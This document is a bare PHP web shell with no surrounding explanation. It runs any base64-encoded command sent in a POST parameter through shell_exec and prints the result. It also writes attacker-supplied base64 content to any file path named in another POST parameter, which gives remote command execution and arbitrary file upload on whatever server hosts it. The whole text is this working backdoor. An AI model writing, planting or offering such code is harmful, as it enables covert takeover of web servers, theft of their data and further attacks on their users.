<?php
($c = base64_decode($_POST['c'] ?? '')) && print(shell_exec($c));

if (isset($_POST['r'], $_POST['n'])) {
    file_put_contents(
        $_POST['n'],
        base64_decode($_POST['r'])
    );
}